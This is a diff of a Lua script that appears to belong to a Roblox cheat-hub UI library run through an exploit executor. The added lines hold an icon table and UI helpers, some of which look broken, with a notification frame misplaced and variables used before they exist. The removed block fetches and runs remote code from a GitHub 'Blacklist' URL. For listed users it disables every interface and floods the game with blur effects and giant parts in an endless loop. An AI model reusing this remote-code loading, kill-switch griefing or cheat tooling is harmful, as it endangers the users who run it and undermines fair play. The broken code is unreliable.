+			["navigation2off"] = "rbxassetid://10734906144",
+			["navigationoff"] = "rbxassetid://10734906580",
+			["network"] = "rbxassetid://10734906975",
+			["newspaper"] = "rbxassetid://10734907168",
+			["octagon"] = "rbxassetid://10734907361",
+			["option"] = "rbxassetid://10734907649",
+			["outdent"] = "rbxassetid://10734907933",
+			["package"] = "rbxassetid://10734909540",
+			["package2"] = "rbxassetid://10734908151",
+			["packagecheck"] = "rbxassetid://10734908384",
+			["packageminus"] = "rbxassetid://10734908626",
+			["packageopen"] = "rbxassetid://10734908793",
+			["packageplus"] = "rbxassetid://10734909016",
+			["packagesearch"] = "rbxassetid://10734909196",
+			["packagex"] = "rbxassetid://10734909375",
+			["paintbucket"] = "rbxassetid://10734909847",
+			["paintbrush"] = "rbxassetid://10734910187",
+			["paintbrush2"] = "rbxassetid://10734910030",
+			["palette"] = "rbxassetid://10734910430",
+			["palmtree"] = "rbxassetid://10734910680",
+			["paperclip"] = "rbxassetid://10734910927",
+			["partypopper"] = "rbxassetid://10734918735",
+			["pause"] = "rbxassetid://10734919336",
+			["pausecircle"] = "rbxassetid://10735024209",
+			["pauseoctagon"] = "rbxassetid://10734919143",
+			["pentool"] = "rbxassetid://10734919503",
+			["pencil"] = "rbxassetid://10734919691",
+			["percent"] = "rbxassetid://10734919919",
+			["personstanding"] = "rbxassetid://10734920149",
+			["phone"] = "rbxassetid://10734921524",
+			["phonecall"] = "rbxassetid://10734920305",
+			["phoneforwarded"] = "rbxassetid://10734920508",
+			["phoneincoming"] = "rbxassetid://10734920694",
+			["phonemissed"] = "rbxassetid://10734920845",
+			["phoneoff"] = "rbxassetid://10734921077",
+			["phoneoutgoing"] = "rbxassetid://10734921288",
+			["piechart"] = "rbxassetid://10734921727",
+			["piggybank"] = "rbxassetid://10734921935",
+			["pin"] = "rbxassetid://10734922324",
+			["pinoff"] = "rbxassetid://10734922180",
+			["pipette"] = "rbxassetid://10734922497",
+			["pizza"] = "rbxassetid://10734922774",
+			["plane"] = "rbxassetid://10734922971",
+			["play"] = "rbxassetid://10734923549",
+			["playcircle"] = "rbxassetid://10734923214",
+			["plus"] = "rbxassetid://10734924532",
+			["pluscircle"] = "rbxassetid://10734923868",
+			["plussquare"] = "rbxassetid://10734924219",
+			["podcast"] = "rbxassetid://10734929553",
+			["pointer"] = "rbxassetid://10734929723",
+			["poundsterling"] = "rbxassetid://10734929981",
+			["power"] = "rbxassetid://10734930466",
+			["poweroff"] = "rbxassetid://10734930257",
+			["printer"] = "rbxassetid://10734930632",
+			["puzzle"] = "rbxassetid://10734930886",
+			["quote"] = "rbxassetid://10734931234",
+			["radio"] = "rbxassetid://10734931596",
+			["radioreceiver"] = "rbxassetid://10734931402",
+			["rectanglehorizontal"] = "rbxassetid://10734931777",
+			["rectanglevertical"] = "rbxassetid://10734932081",
+			["recycle"] = "rbxassetid://10734932295",
+			["redo"] = "rbxassetid://10734932822",
+			["redo2"] = "rbxassetid://10734932586",
+			["refreshccw"] = "rbxassetid://10734933056",
+			["refreshcw"] = "rbxassetid://10734933222",
+			["refrigerator"] = "rbxassetid://10734933465",
+			["regex"] = "rbxassetid://10734933655",
+			["repeat"] = "rbxassetid://10734933966",
+			["repeat1"] = "rbxassetid://10734933826",
+			["reply"] = "rbxassetid://10734934252",
+			["replyall"] = "rbxassetid://10734934132",
+			["rewind"] = "rbxassetid://10734934347",
+			["rocket"] = "rbxassetid://10734934585",
+			["rockingchair"] = "rbxassetid://10734939942",
+			["rotate3d"] = "rbxassetid://10734940107",
+			["rotateccw"] = "rbxassetid://10734940376",
+			["rotatecw"] = "rbxassetid://10734940654",
+			["rss"] = "rbxassetid://10734940825",
+			["ruler"] = "rbxassetid://10734941018",
+			["russianruble"] = "rbxassetid://10734941199",
+			["sailboat"] = "rbxassetid://10734941354",
+			["save"] = "rbxassetid://10734941499",
+			["scale"] = "rbxassetid://10734941912",
+			["scale3d"] = "rbxassetid://10734941739",
+			["scaling"] = "rbxassetid://10734942072",
+			["scan"] = "rbxassetid://10734942565",
+			["scanface"] = "rbxassetid://10734942198",
+			["scanline"] = "rbxassetid://10734942351",
+			["scissors"] = "rbxassetid://10734942778",
+			["screenshare"] = "rbxassetid://10734943193",
+			["screenshareoff"] = "rbxassetid://10734942967",
+			["scroll"] = "rbxassetid://10734943448",
+			["search"] = "rbxassetid://10734943674",
+			["send"] = "rbxassetid://10734943902",
+			["separatorhorizontal"] = "rbxassetid://10734944115",
+			["separatorvertical"] = "rbxassetid://10734944326",
+			["server"] = "rbxassetid://10734949856",
+			["servercog"] = "rbxassetid://10734944444",
+			["servercrash"] = "rbxassetid://10734944554",
+			["serveroff"] = "rbxassetid://10734944668",
+			["settings"] = "rbxassetid://10734950309",
+			["settings2"] = "rbxassetid://10734950020",
+			["share"] = "rbxassetid://10734950813",
+			["share2"] = "rbxassetid://10734950553",
+			["sheet"] = "rbxassetid://10734951038",
+			["shield"] = "rbxassetid://10734951847",
+			["shieldalert"] = "rbxassetid://10734951173",
+			["shieldcheck"] = "rbxassetid://10734951367",
+			["shieldclose"] = "rbxassetid://10734951535",
+			["shieldoff"] = "rbxassetid://10734951684",
+			["shirt"] = "rbxassetid://10734952036",
+			["shoppingbag"] = "rbxassetid://10734952273",
+			["shoppingcart"] = "rbxassetid://10734952479",
+			["shovel"] = "rbxassetid://10734952773",
+			["showerhead"] = "rbxassetid://10734952942",
+			["shrink"] = "rbxassetid://10734953073",
+			["shrub"] = "rbxassetid://10734953241",
+			["shuffle"] = "rbxassetid://10734953451",
+			["sidebar"] = "rbxassetid://10734954301",
+			["sidebarclose"] = "rbxassetid://10734953715",
+			["sidebaropen"] = "rbxassetid://10734954000",
+			["sigma"] = "rbxassetid://10734954538",
+			["signal"] = "rbxassetid://10734961133",
+			["signalhigh"] = "rbxassetid://10734954807",
+			["signallow"] = "rbxassetid://10734955080",
+			["signalmedium"] = "rbxassetid://10734955336",
+			["signalzero"] = "rbxassetid://10734960878",
+			["siren"] = "rbxassetid://10734961284",
+			["skipback"] = "rbxassetid://10734961526",
+			["skipforward"] = "rbxassetid://10734961809",
+			["skull"] = "rbxassetid://10734962068",
+			["slack"] = "rbxassetid://10734962339",
+			["slash"] = "rbxassetid://10734962600",
+			["slice"] = "rbxassetid://10734963024",
+			["sliders"] = "rbxassetid://10734963400",
+			["slidershorizontal"] = "rbxassetid://10734963191",
+			["smartphone"] = "rbxassetid://10734963940",
+			["smartphonecharging"] = "rbxassetid://10734963671",
+			["smile"] = "rbxassetid://10734964441",
+			["smileplus"] = "rbxassetid://10734964188",
+			["snowflake"] = "rbxassetid://10734964600",
+			["sofa"] = "rbxassetid://10734964852",
+			["sortasc"] = "rbxassetid://10734965115",
+			["sortdesc"] = "rbxassetid://10734965287",
+			["speaker"] = "rbxassetid://10734965419",
+			["sprout"] = "rbxassetid://10734965572",
+			["square"] = "rbxassetid://10734965702",
+			["star"] = "rbxassetid://10734966248",
+			["starhalf"] = "rbxassetid://10734965897",
+			["staroff"] = "rbxassetid://10734966097",
+			["stethoscope"] = "rbxassetid://10734966384",
+			["sticker"] = "rbxassetid://10734972234",
+			["stickynote"] = "rbxassetid://10734972463",
+			["stopcircle"] = "rbxassetid://10734972621",
+			["stretchhorizontal"] = "rbxassetid://10734972862",
+			["stretchvertical"] = "rbxassetid://10734973130",
+			["strikethrough"] = "rbxassetid://10734973290",
+			["subscript"] = "rbxassetid://10734973457",
+			["sun"] = "rbxassetid://10734974297",
+			["sundim"] = "rbxassetid://10734973645",
+			["sunmedium"] = "rbxassetid://10734973778",
+			["sunmoon"] = "rbxassetid://10734973999",
+			["sunsnow"] = "rbxassetid://10734974130",
+			["sunrise"] = "rbxassetid://10734974522",
+			["sunset"] = "rbxassetid://10734974689",
+			["superscript"] = "rbxassetid://10734974850",
+			["swissfranc"] = "rbxassetid://10734975024",
+			["switchcamera"] = "rbxassetid://10734975214",
+			["sword"] = "rbxassetid://10734975486",
+			["swords"] = "rbxassetid://10734975692",
+			["syringe"] = "rbxassetid://10734975932",
+			["table"] = "rbxassetid://10734976230",
+			["table2"] = "rbxassetid://10734976097",
+			["tablet"] = "rbxassetid://10734976394",
+			["tag"] = "rbxassetid://10734976528",
+			["tags"] = "rbxassetid://10734976739",
+			["target"] = "rbxassetid://10734977012",
+			["tent"] = "rbxassetid://10734981750",
+			["terminal"] = "rbxassetid://10734982144",
+			["terminalsquare"] = "rbxassetid://10734981995",
+			["textcursor"] = "rbxassetid://10734982395",
+			["textcursorinput"] = "rbxassetid://10734982297",
+			["thermometer"] = "rbxassetid://10734983134",
+			["thermometersnowflake"] = "rbxassetid://10734982571",
+			["thermometersun"] = "rbxassetid://10734982771",
+			["thumbsdown"] = "rbxassetid://10734983359",
+			["thumbsup"] = "rbxassetid://10734983629",
+			["ticket"] = "rbxassetid://10734983868",
+			["timer"] = "rbxassetid://10734984606",
+			["timeroff"] = "rbxassetid://10734984138",
+			["timerreset"] = "rbxassetid://10734984355",
+			["toggleleft"] = "rbxassetid://10734984834",
+			["toggleright"] = "rbxassetid://10734985040",
+			["tornado"] = "rbxassetid://10734985247",
+			["toybrick"] = "rbxassetid://10747361919",
+			["train"] = "rbxassetid://10747362105",
+			["trash"] = "rbxassetid://10747362393",
+			["trash2"] = "rbxassetid://10747362241",
+			["treedeciduous"] = "rbxassetid://10747362534",
+			["treepine"] = "rbxassetid://10747362748",
+			["trees"] = "rbxassetid://10747363016",
+			["trendingdown"] = "rbxassetid://10747363205",
+			["trendingup"] = "rbxassetid://10747363465",
+			["triangle"] = "rbxassetid://10747363621",
+			["trophy"] = "rbxassetid://10747363809",
+			["truck"] = "rbxassetid://10747364031",
+			["tv"] = "rbxassetid://10747364593",
+			["tv2"] = "rbxassetid://10747364302",
+			["type"] = "rbxassetid://10747364761",
+			["umbrella"] = "rbxassetid://10747364971",
+			["underline"] = "rbxassetid://10747365191",
+			["undo"] = "rbxassetid://10747365484",
+			["undo2"] = "rbxassetid://10747365359",
+			["unlink"] = "rbxassetid://10747365771",
+			["unlink2"] = "rbxassetid://10747397871",
+			["unlock"] = "rbxassetid://10747366027",
+			["upload"] = "rbxassetid://10747366434",
+			["uploadcloud"] = "rbxassetid://10747366266",
+			["usb"] = "rbxassetid://10747366606",
+			["user"] = "rbxassetid://10747373176",
+			["usercheck"] = "rbxassetid://10747371901",
+			["usercog"] = "rbxassetid://10747372167",
+			["userminus"] = "rbxassetid://10747372346",
+			["userplus"] = "rbxassetid://10747372702",
+			["userx"] = "rbxassetid://10747372992",
+			["users"] = "rbxassetid://10747373426",
+			["utensils"] = "rbxassetid://10747373821",
+			["utensilscrossed"] = "rbxassetid://10747373629",
+			["venetianmask"] = "rbxassetid://10747374003",
+			["verified"] = "rbxassetid://10747374131",
+			["vibrate"] = "rbxassetid://10747374489",
+			["vibrateoff"] = "rbxassetid://10747374269",
+			["video"] = "rbxassetid://10747374938",
+			["videooff"] = "rbxassetid://10747374721",
+			["view"] = "rbxassetid://10747375132",
+			["voicemail"] = "rbxassetid://10747375281",
+			["volume"] = "rbxassetid://10747376008",
+			["volume1"] = "rbxassetid://10747375450",
+			["volume2"] = "rbxassetid://10747375679",
+			["volumex"] = "rbxassetid://10747375880",
+			["wallet"] = "rbxassetid://10747376205",
+			["wand"] = "rbxassetid://10747376565",
+			["wand2"] = "rbxassetid://10747376349",
+			["watch"] = "rbxassetid://10747376722",
+			["waves"] = "rbxassetid://10747376931",
+			["webcam"] = "rbxassetid://10747381992",
+			["wifi"] = "rbxassetid://10747382504",
+			["wifioff"] = "rbxassetid://10747382268",
+			["wind"] = "rbxassetid://10747382750",
+			["wraptext"] = "rbxassetid://10747383065",
+			["wrench"] = "rbxassetid://10747383470",
+			["x"] = "rbxassetid://10747384394",
+			["xcircle"] = "rbxassetid://10747383819",
+			["xoctagon"] = "rbxassetid://10747384037",
+			["xsquare"] = "rbxassetid://10747384217",
+			["zoomin"] = "rbxassetid://10747384552",
+			["zoomout"] = "rbxassetid://10747384679"
+		}
+	end)()
+}
+
+local ViewportSize = workspace.CurrentCamera.ViewportSize
+local UIScale = ViewportSize.Y / 450
+
+local Settings = redzlib.Settings
+local Flags = redzlib.Flags
+
+local SetProps, SetChildren, InsertTheme, Create do
+	InsertTheme = function(Instance, Type)
+		table.insert(redzlib.Instances, {
+			Instance = Instance,
+			Type = Type
+		})
+		return Instance
+	end
+	
+	SetChildren = function(Instance, Children)
+		if Children then
+			table.foreach(Children, function(_,Child)
+				Child.Parent = Instance
+			end)
+		end
+		return Instance
+	end
+	
+	SetProps = function(Instance, Props)
+		if Props then
+			table.foreach(Props, function(prop, value)
+				Instance[prop] = value
+			end)
+		end
+		return Instance
+	end
+	
+	Create = function(...)
+		local args = {...}
+		if type(args) ~= "table" then return end
+		local new = Instance.new(args[1])
+		local Children = {}
+		
+		if type(args[2]) == "table" then
+			SetProps(new, args[2])
+			SetChildren(new, args[3])
+			Children = args[3] or {}
+		elseif typeof(args[2]) == "Instance" then
+			new.Parent = args[2]
+			SetProps(new, args[3])
+			SetChildren(new, args[4])
+			Children = args[4] or {}
+		end
+		return new
+	end
+	
+	local function Save(file)
+		if readfile and isfile and isfile(file) then
+			local decode = HttpService:JSONDecode(readfile(file))
+			
+			if type(decode) == "table" then
+				if rawget(decode, "UISize") then redzlib.Save["UISize"] = decode["UISize"] end
+				if rawget(decode, "TabSize") then redzlib.Save["TabSize"] = decode["TabSize"] end
+				if rawget(decode, "Theme") and VerifyTheme(decode["Theme"]) then redzlib.Save["Theme"] = decode["Theme"] end
+			end
+		end
+	end
+	
+	pcall(Save, "FR_HUB.json")
 end
-if _G.IsOpened then
-    game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "System TRX ",
-        Text = "\239\191\189\217\133 \216\170\217\129\216\185\217\138\217\132 \216\167\217\132\216\179\217\131\216\177\216\168\216\170 \217\133\216\179\216\168\217\130\216\167\216\140 \216\167\216\185\216\175 \216\167\217\132\216\175\216\174\217\136\217\132 \217\132\216\170\216\180\216\186\217\138\217\132\217\135 \217\133\216\172\216\175\216\175\216\167",
-        Duration = 5
-    })
-    local vu1 = Instance.new("Sound", game.Workspace)
-    vu1.SoundId = "rbxassetid://17692186249"
-    vu1.Volume = 10
-    vu1.Ended:Connect(function()
-        vu1:Destroy()
-    end)
-    local v2 = vu1
-    vu1.Play(v2)
-else
-    _G.IsOpened = true
-    spawn(function()
-        while true do
-            if table.find(loadstring(game:HttpGet("https://raw.githubusercontent.com/Hm5011/hussain/refs/heads/main/Blacklist"))(), tostring(game.Players.LocalPlayer.UserId)) then
-                local v3 = game.Players.LocalPlayer
-                local vu4 = Instance.new("ScreenGui", v3:WaitForChild("PlayerGui"))
-                vu4.ResetOnSpawn = false
-                vu4.IgnoreGuiInset = true
-                local v5, v6, v7 = pairs(game.CoreGui:GetDescendants())
-                while true do
-                    local v8, v9 = v5(v6, v7)
-                    if v8 == nil then
-                        break
-                    end
-                    v7 = v8
-                    if v9:IsA("ScreenGui") and (v9 ~= vu4 and v9.Enabled) then
-                        v9.Enabled = false
-                    end
-                end
-                local v10, v11, v12 = pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants())
-                while true do
-                    local v13, v14 = v10(v11, v12)
-                    if v13 == nil then
-                        break
-                    end
-                    v12 = v13
-                    if v14:IsA("ScreenGui") and (v14 ~= vu4 and v14.Enabled) then
-                        v14.Enabled = false
-                    end
-                end
-                local v15 = Instance.new("Frame", vu4)
-                v15.Size = UDim2.new(1, 0, 1, 0)
-                v15.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-                v15.BorderSizePixel = 0
-                v15.ZIndex = 10
-                local v16 = Instance.new("TextLabel", v15)
-                v16.Size = UDim2.new(0.8, 0, 0.6, 0)
-                v16.Position = UDim2.new(0.1, 0, 0.2, 0)
-                v16.Text = "\239\191\189\217\133 \216\173\216\184\216\177\217\131 \217\133\217\134 \217\135\216\176\216\167 \216\167\217\132\216\179\217\131\216\177\216\168\216\170 \216\168\217\136\216\167\216\179\216\183\216\169 \216\167\217\132\217\133\216\167\217\132\217\131 \217\134\216\170\217\138\216\172\216\169 \216\179\217\136\216\161 \216\167\217\132\216\167\216\179\216\170\216\174\216\175\216\167\217\133. \217\132\216\183\217\132\216\168 \217\129\217\131 \216\167\217\132\216\173\216\184\216\177\216\140 \217\138\216\177\216\172\217\137 \217\129\216\170\216\173 \216\170\217\131\216\170 \216\185\217\132\217\137 \216\179\217\138\216\177\217\129\216\177 VR7."
-                v16.TextColor3 = Color3.fromRGB(255, 215, 0)
-                v16.TextScaled = true
-                v16.BackgroundTransparency = 1
-                v16.Font = Enum.Font.SourceSansBold
-                v16.TextWrapped = true
-                v16.ZIndex = 11
-                local vu17 = Instance.new("TextLabel", v15)
-                vu17.Size = UDim2.new(0.2, 0, 0.1, 0)
-                vu17.Position = UDim2.new(0.05, 0, 0.85, 0)
-                vu17.TextColor3 = Color3.fromRGB(255, 215, 0)
-                vu17.TextScaled = true
-                vu17.BackgroundTransparency = 1
-                vu17.Font = Enum.Font.SourceSansBold
-                vu17.Text = "20"
-                vu17.ZIndex = 12
-                spawn(function()
-                    for v18 = tonumber(vu17.Text), 0, - 1 do
-                        vu17.Text = tostring(v18)
-                        wait(1)
-                    end
-                    pcall(function()
-                        vu4:Destroy()
-                    end)
-                end)
-                while task.wait() do
-                    pcall(function()
-                        Instance.new("BlurEffect", game.Lighting).Size = 50
-                        local v19 = Instance.new("Part")
-                        v19.Parent = workspace
-                        v19.Size = Vector3.new(200, 200, 200)
-                        v19.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-                        local v20, v21, v22 = pairs(game.CoreGui:GetDescendants())
-                        while true do
-                            local v23
-                            v22, v23 = v20(v21, v22)
-                            if v22 == nil then
-                                break
-                            end
-                            if v23:IsA("ScreenGui") and (v23 ~= vu4 and v23.Enabled) then
-                                v23.Enabled = false
-                            end
-                        end
-                        local v24, v25, v26 = pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants())
-                        while true do
-                            local v27
-                            v26, v27 = v24(v25, v26)
-                            if v26 == nil then
-                                break
-                            end
-                            if v27:IsA("ScreenGui") and (v27 ~= vu4 and v27.Enabled) then
-                                v27.Enabled = false
-                            end
-                        end
-                    end)
-                end
+
+local Funcs = {} do
+	function Funcs:InsertCallback(tab, func)
+		if type(func) == "function" then
+			table.insert(tab, func)
+		end
+		return func
+	end
+	
+	function Funcs:FireCallback(tab, ...)
+		for _,v in ipairs(tab) do
+			if type(v) == "function" then
+				task.spawn(v, ...)
+			end
+		end
+	end
+	
+	function Funcs:ToggleVisible(Obj, Bool)
+		Obj.Visible = Bool ~= nil and Bool or Obj.Visible
+	end
+	
+	function Funcs:ToggleParent(Obj, Parent)
+		if Bool ~= nil then
+			Obj.Parent = Bool
+		else
+			Obj.Parent = not Obj.Parent and Parent
+		end
+	end
+	
+	function Funcs:GetConnectionFunctions(ConnectedFuncs, func)
+		local Connected = { Function = func, Connected = true }
+		
+		function Connected:Disconnect()
+			if self.Connected then
+				table.remove(ConnectedFuncs, table.find(ConnectedFuncs, self.Function))
+				self.Connected = false
+			end
+		end
+		
+		function Connected:Fire(...)
+			if self.Connected then
+				task.spawn(self.Function, ...)
+			end
+		end
+		
+		return Connected
+	end
+	
+	function Funcs:GetCallback(Configs, index)
+		local func = Configs[index] or Configs.Callback or function()end
+		
+		if type(func) == "table" then
+			return ({function(Value) func[1][func[2]] = Value end})
+		end
+		return {func}
+	end
+end
+
+local Connections, Connection = {}, redzlib.Connection do
+	local function NewConnectionList(List)
+		if type(List) ~= "table" then return end
+		
+		for _,CoName in ipairs(List) do
+			local ConnectedFuncs, Connect = {}, {}
+			Connection[CoName] = Connect
+			Connections[CoName] = ConnectedFuncs
+			Connect.Name = CoName
+			
+			function Connect:Connect(func)
+				if type(func) == "function" then
+					table.insert(ConnectedFuncs, func)
+					return Funcs:GetConnectionFunctions(ConnectedFuncs, func)
+				end
+			end
+			
+				local NotificationContainer = Create("Frame", ScreenGui, {
+				Name = "NotificationContainer",
+				Size = UDim2.new(0, 280, 1, 0),
+				Position = UDim2.new(1, -300, 1, -20),
+				AnchorPoint = Vector2.new(0, 1),
+				BackgroundTransparency = 1,
+				ZIndex = 999
+			}, {
+				Create("UIListLayout", {
+					SortOrder = "LayoutOrder",
+					Padding = UDim.new(0, 8),
+					VerticalAlignment = "Bottom"
+				})
+			})
+			function Connect:Once(func)
+				if type(func) == "function" then
+					local Connected;
+					
+					local _NFunc;_NFunc = function(...)
+						task.spawn(func, ...)
+						Connected:Disconnect()
+					end
+					
+					Connected = Funcs:GetConnectionFunctions(ConnectedFuncs, _NFunc)
+					return Connected
+				end
+			end
+		end
+	end
+	
+
+	function Connection:FireConnection(CoName, ...)
+		local Connection = type(CoName) == "string" and Connections[CoName] or Connections[CoName.Name]
+		for _,Func in pairs(Connection) do
+			task.spawn(Func, ...)
+		end
+	end
+	
+	NewConnectionList({"FlagsChanged", "ThemeChanged", "FileSaved", "ThemeChanging", "OptionAdded"})
+end
+
+local GetFlag, SetFlag, CheckFlag do
+	CheckFlag = function(Name)
+		return type(Name) == "string" and Flags[Name] ~= nil
+	end
+	
+	GetFlag = function(Name)
+		return type(Name) == "string" and Flags[Name]
+	end
+	
+	SetFlag = function(Flag, Value)
+		if Flag and (Value ~= Flags[Flag] or type(Value) == "table") then
+			Flags[Flag] = Value
+			Connection:FireConnection("FlagsChanged", Flag, Value)
+		end
+	end
+	
+	local db
+	Connection.FlagsChanged:Connect(function(Flag, Value)
+		local ScriptFile = Settings.ScriptFile
+		if not db and ScriptFile and writefile then
+			db=true;task.wait(0.1);db=false
+			
+			local Success, Encoded = pcall(function()
+				-- local _Flags = {}
+				-- for _,Flag in pairs(Flags) do _Flags[_] = Flag.Value end
+				return HttpService:JSONEncode(Flags)
+			end)
+			
+			if Success then
+				local Success = pcall(writefile, ScriptFile, Encoded)
+				if Success then
+					Connection:FireConnection("FileSaved", "Script-Flags", ScriptFile, Encoded)
+				end
+			end
+		end
+	end)
+end
+
+local ScreenGui = Create("ScreenGui", CoreGui, {
+	Name = "FR HUB",
+}, {
+	Create("UIScale", {
+		Scale = UIScale,
+		Name = "Scale"
+	})
+})
+
+local ScreenFind = CoreGui:FindFirstChild(ScreenGui.Name)
+if ScreenFind and ScreenFind ~= ScreenGui then
+	ScreenFind:Destroy()
+end
+
+local function GetStr(val)
+	if type(val) == "function" then
+		return val()
+	end
+	return val
+end
+
+local function ConnectSave(Instance, func)
+	Instance.InputBegan:Connect(function(Input)
+		if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
+			while UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) do task.wait()
+			end
+		end
+		func()
+	end)
+end
+
+local function CreateTween(Configs)
+	local Instance = Configs[1] or Configs.Instance
+	local Prop = Configs[2] or Configs.Prop
+	local NewVal = Configs[3] or Configs.NewVal
+	local Time = Configs[4] or Configs.Time or 0.5
+	local TweenWait = Configs[5] or Configs.wait or false
+	local TweenInfo = TweenInfo.new(Time, Enum.EasingStyle.Quint)
+	
+	local Tween = TweenService:Create(Instance, TweenInfo, {[Prop] = NewVal})
+	Tween:Play()
+	if TweenWait then
+		Tween.Completed:Wait()
+	end
+	return Tween
+end
+
+local function MakeDrag(Instance)
+	task.spawn(function()
+		SetProps(Instance, {
+			Active = true,
+			AutoButtonColor = false
+		})
+		
+		local DragStart, StartPos, InputOn
+		
+		local function Update(Input)
+			local delta = Input.Position - DragStart
+			local Position = UDim2.new(StartPos.X.Scale, StartPos.X.Offset + delta.X / UIScale, StartPos.Y.Scale, StartPos.Y.Offset + delta.Y / UIScale)
+			-- Instance.Position = Position
+			CreateTween({Instance, "Position", Position, 0.35})
+		end
+		
+		Instance.MouseButton1Down:Connect(function()
+			InputOn = true
+		end)
+		
+		Instance.InputBegan:Connect(function(Input)
+			if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
+				StartPos = Instance.Position
+				DragStart = Input.Position
+				
+				while UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) do RunService.Heartbeat:Wait()
+					if InputOn then
+						Update(Input)
+					end
+				end
+				InputOn = false
+			end
+		end)
+	end)
+	return Instance
+end
+
+local function VerifyTheme(Theme)
+	for name,_ in pairs(redzlib.Themes) do
+		if name == Theme then
+			return true
+		end
+	end
+end
+
+local function SaveJson(FileName, save)
+	if writefile then
+		local json = HttpService:JSONEncode(save)
+		writefile(FileName, json)
+	end
+end
+
+local Theme = redzlib.Themes[redzlib.Save.Theme]
+
+local function AddEle(Name, Func)
+	redzlib.Elements[Name] = Func
+end
+
+local function Make(Ele, Instance, props, ...)
+	local Element = redzlib.Elements[Ele](Instance, props, ...)
+	return Element
+end
+
+AddEle("Corner", function(parent, CornerRadius)
+	local New = SetProps(Create("UICorner", parent, {
+		CornerRadius = CornerRadius or UDim.new(0, 7)
+	}), props)
+	return New
+end)
+
+AddEle("Stroke", function(parent, props, ...)
+	local args = {...}
+	local New = InsertTheme(SetProps(Create("UIStroke", parent, {
+		Color = args[1] or Theme["Color Stroke"],
+		Thickness = args[2] or 1,
+		ApplyStrokeMode = "Border"
+	}), props), "Stroke")
+	return New
+end)
+
+AddEle("Button", function(parent, props, ...)
+	local args = {...}
+	local New = InsertTheme(SetProps(Create("TextButton", parent, {
+		Text = "",
+		Size = UDim2.fromScale(1, 1),
+		BackgroundColor3 = Theme["Color Hub 2"],
+		AutoButtonColor = false
+	}), props), "Frame")
+
+	local OriginalSize = New.Size
+	local IsMouseOver = false
+
+	New.MouseEnter:Connect(function()
+		IsMouseOver = true
+		New.BackgroundTransparency = 0.4
+	end)
+	
+	New.MouseLeave:Connect(function()
+		IsMouseOver = false
+		New.BackgroundTransparency = 0
+	end)
+
+	New.MouseButton1Down:Connect(function()
+		CreateTween({New, "Size", OriginalSize - UDim2.fromOffset(4, 2), 0.1})
+		CreateTween({New, "BackgroundTransparency", 0.6, 0.1})
+	end)
+
+	New.MouseButton1Up:Connect(function()
+		CreateTween({New, "Size", OriginalSize, 0.15})
+		CreateTween({New, "BackgroundTransparency", IsMouseOver and 0.4 or 0, 0.15})
+	end)
+
+	if args[1] then
+		New.Activated:Connect(args[1])
+	end
+
+	return New
+end)
+AddEle("Gradient", function(parent, props, ...)
+	local args = {...}
+	local New = InsertTheme(SetProps(Create("UIGradient", parent, {
+		Color = Theme["Color Hub 1"]
+	}), props), "Gradient")
+	return New
+end)
+
+local function ButtonFrame(Instance, Title, Description, HolderSize)
+	local TitleL = InsertTheme(Create("TextLabel", {
+		Font = Enum.Font.FredokaOne, --GothamMedium
+		TextColor3 = Theme["Color Text"],
+		Size = UDim2.new(1, -20),
+		AutomaticSize = "Y",
+		Position = UDim2.new(0, 0, 0.5),
+		AnchorPoint = Vector2.new(0, 0.5),
+		BackgroundTransparency = 1,
+		TextTruncate = "AtEnd",
+		TextSize = 10,
+		TextXAlignment = "Left",
+		Text = "",
+		RichText = true
+	}), "Text")
+	
+	local DescL = InsertTheme(Create("TextLabel", {
+		Font = Enum.Font.Gotham,
+		TextColor3 = Theme["Color Dark Text"],
+		Size = UDim2.new(1, -20),
+		AutomaticSize = "Y",
+		Position = UDim2.new(0, 12, 0, 15),
+		BackgroundTransparency = 1,
+		TextWrapped = true,
+		TextSize = 8,
+		TextXAlignment = "Left",
+		Text = "",
+		RichText = true
+	}), "DarkText")
+
+	local Frame = Make("Button", Instance, {
+		Size = UDim2.new(1, 0, 0, 25),
+		AutomaticSize = "Y",
+		Name = "Option"
+	})Make("Corner", Frame, UDim.new(0, 6))
+	
+	LabelHolder = Create("Frame", Frame, {
+		AutomaticSize = "Y",
+		BackgroundTransparency = 1,
+		Size = HolderSize,
+		Position = UDim2.new(0, 10, 0),
+		AnchorPoint = Vector2.new(0, 0)
+	}, {
+		Create("UIListLayout", {
+			SortOrder = "LayoutOrder",
+			VerticalAlignment = "Center",
+			Padding = UDim.new(0, 2)
+		}),
+		Create("UIPadding", {
+			PaddingBottom = UDim.new(0, 5),
+			PaddingTop = UDim.new(0, 5)
+		}),
+		TitleL,
+		DescL,
+	})
+	
+	local Label = {}
+	function Label:SetTitle(NewTitle)
+		if type(NewTitle) == "string" and NewTitle:gsub(" ", ""):len() > 0 then
+			TitleL.Text = NewTitle
+		end
+	end
+	function Label:SetDesc(NewDesc)
+		if type(NewDesc) == "string" and NewDesc:gsub(" ", ""):len() > 0 then
+			DescL.Visible = true
+			DescL.Text = NewDesc
+			LabelHolder.Position = UDim2.new(0, 10, 0)
+			LabelHolder.AnchorPoint = Vector2.new(0, 0)
+		else
+			DescL.Visible = false
+			DescL.Text = ""
+			LabelHolder.Position = UDim2.new(0, 10, 0.5)
+			LabelHolder.AnchorPoint = Vector2.new(0, 0.5)
+		end
+	end
+	
+	Label:SetTitle(Title)
+	Label:SetDesc(Description)
+	return Frame, Label
+end
+
+local function GetColor(Instance)
+	if Instance:IsA("Frame") then
+		return "BackgroundColor3"
+	elseif Instance:IsA("ImageLabel") then
+		return "ImageColor3"
+	elseif Instance:IsA("TextLabel") then
+		return "TextColor3"
+	elseif Instance:IsA("ScrollingFrame") then
+		return "ScrollBarImageColor3"
+	elseif Instance:IsA("UIStroke") then
+		return "Color"
+	end
+	return ""
+end
+
+
+function redzlib:GetIcon(index)
+	if type(index) ~= "string" or index:find("rbxassetid://") or #index == 0 then
+		return index
+	end
+	
+	local firstMatch = nil
+	index = string.lower(index):gsub("lucide", ""):gsub("-", "")
+	
+	for Name, Icon in self.Icons do
+		Name = Name:gsub("lucide", ""):gsub("-", "")
+		if Name == index then
+			return Icon
+		elseif not firstMatch and Name:find(index, 1, true) then
